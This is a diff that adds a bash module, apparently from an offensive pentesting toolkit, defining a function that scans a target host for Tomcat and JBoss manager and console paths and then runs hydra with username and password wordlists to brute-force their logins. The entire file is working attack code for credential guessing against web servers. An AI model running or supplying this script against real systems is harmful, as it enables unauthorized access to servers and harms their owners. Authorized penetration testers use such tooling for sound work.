@@ -1,0 +1,22 @@
+#!/bin/bash
+
+. "${repository_root}/yaes/modules/common-utils"
+
+function tomcat_bruteforce
+{
+  target=${1}
+  port=${2}
+  > ${tomcat_bruteforce_logfile}
+  decho_green "bruteforcing tomcat manager..."
+  decho "looking for path on server..."
+  locations=( '/status' '/admin' '/web-console' '/jmx-console' '/admin-console' '/manager/html' '/tomcat/manager/html' '/host-manager/html' '/server-manager/html' '/web-console/Invoker' '/jmx-console/HtmlAdaptor' '/invoker/JMXInvokerServlet' )
+  for location in "${locations[@]}"
+  do
+    curl -s -I http://${target}:${port}${location} | grep -q "401"
+    if [[ ${?} -eq 0 ]]
+    then
+      decho_green "found possible manager location ${location}, starting bruteforce..."
+      hydra -L ${repository_root}/sec-lists/tomcat-userdb.txt  -P ${repository_root}/sec-lists/tomcat-passdb.txt  -s ${port} ${target} http-get ${location} &>> ${tomcat_bruteforce_logfile}
+    fi
+  done
+}
